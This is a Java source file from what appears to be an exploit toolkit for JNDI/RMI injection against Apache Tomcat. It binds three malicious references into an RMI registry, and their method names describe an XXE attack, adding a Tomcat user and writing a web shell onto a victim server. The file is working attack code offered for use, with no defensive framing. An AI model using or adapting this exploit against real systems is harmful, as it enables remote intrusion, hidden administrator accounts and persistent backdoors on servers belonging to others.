package xyz.eki.marshalexp.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import xyz.eki.marshalexp.gadget.jndi.rmi.GTomcatMemoryUserDatabaseFactory;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import static xyz.eki.marshalexp.jndi.rmi.AttackWithTomcatBeanFactory.CreateDirWithH2;

/*
XXE or RCE
 */
public class AttackWithTomcatMemoryUserDatabaseFactory {
    public static void main(String[] args) throws Exception {
        CreateDirWithH2();
        AttackWithXXE();
        AttackWithAddTomcatUser();
        AttackWithWriteWebShell();
    }

    public static void AttackWithXXE() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatMemoryUserDatabaseFactory.AttackWithXXE();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithAddTomcatUser() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatMemoryUserDatabaseFactory.AttackWithAddTomcatUser();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo1", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithWriteWebShell() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatMemoryUserDatabaseFactory.AttackWithWriteWebShell();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo2", wrapper);
        System.err.println("Server ready");
    }
}
